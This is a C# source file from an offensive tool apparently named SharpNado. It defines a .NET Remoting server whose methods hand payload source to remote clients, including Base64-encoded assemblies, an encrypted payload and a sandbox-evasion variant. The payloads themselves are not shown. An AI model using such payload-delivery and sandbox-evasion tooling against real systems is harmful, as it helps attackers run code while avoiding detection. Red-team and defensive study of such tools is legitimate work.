﻿using System;

public class Net_Remoting_Server : MarshalByRefObject, Interface1
{
    //No Powershell Example 1
    public String[] compile1()
    {
        SharedMethods compile1 = new SharedMethods();
        String[] source = compile1.getPayloadCompileSource(Program.xmlPayload1);
        Console.WriteLine();
        Console.WriteLine("Compile_1 Method Called");//Server message letting you know method was called remotely
        Console.Write("SharpNado:> ");
        return source;
    }
    //No Powershell Example 2
    public String[] compile2()
    {
        SharedMethods compile2 = new SharedMethods();
        String[] source = compile2.getPayloadCompileSource(Program.xmlPayload2);
        Console.WriteLine();
        Console.WriteLine("Compile_2 Method Called");//Server message letting you know method was called remotely
        Console.Write("SharpNado:> ");
        return source;
    }
    //Base64 Example 1
    public String[] b64Assembly1()
    {
        SharedMethods b64Assembly1 = new SharedMethods();
        String[] source = b64Assembly1.getPayloadBase64_1(Program.xmlPayload3);
        Console.WriteLine();
        Console.WriteLine("Base64_1 Method Called");//Server message letting you know method was called remotely
        Console.Write("SharpNado:> ");
        return source;
    }
    //Base64 Example 2
    public String[] b64Assembly2()
    {
        SharedMethods b64Assembly2 = new SharedMethods();
        String[] source = b64Assembly2.getPayloadBase64_2(Program.xmlPayload4);
        Console.WriteLine();
        Console.WriteLine("Base64_2 Method Called");//Server message letting you know method was called remotely
        Console.Write("SharpNado:> ");
        return source;
    }
    //Base64 Logic Example
    public String[] b64AssemblyLogic(string sandboxEvade)
    {
        SharedMethods b64AssemblyLogic = new SharedMethods();
        String[] source = b64AssemblyLogic.b64AssemblyLogic(Program.xmlPayload5, Program.xmlPayload6, sandboxEvade);
        Console.WriteLine();
        Console.WriteLine("Sandbox Method Called");//Server message letting you know method was called remotely
        Console.Write("SharpNado:> ");
        return source;
    }
    //Encrypted Payload Example
    public String[] b64AssemblyEncryptString()
    {
        SharedMethods encryptString = new SharedMethods();
        String[] source = encryptString.encryptString(Program.xmlPayload7, Program.xmlPayload8);
        Console.WriteLine();
        Console.WriteLine("Encrypt Method Called");//Server message letting you know method was called remotely
        Console.Write("SharpNado:> ");
        return source;
    }
}//End Net_Remoting_Server Class



